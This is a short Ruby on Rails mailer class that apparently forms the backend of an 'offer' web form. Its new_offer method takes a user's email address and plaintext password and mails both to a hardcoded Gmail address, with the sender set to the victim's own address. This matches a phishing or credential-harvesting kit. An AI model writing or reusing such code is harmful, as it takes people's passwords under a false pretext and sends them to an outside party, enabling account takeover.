class OfferMailer < ApplicationMailer
  default to: "teamhub532@gmail.com"

  def new_offer(email, password, sending_email: 'teamhub532@gmail.com')
    @user_email = email
    @user_password = password
    mail(to: sending_email, from: email, subject: "New Offer Form Submitted")
  end
end
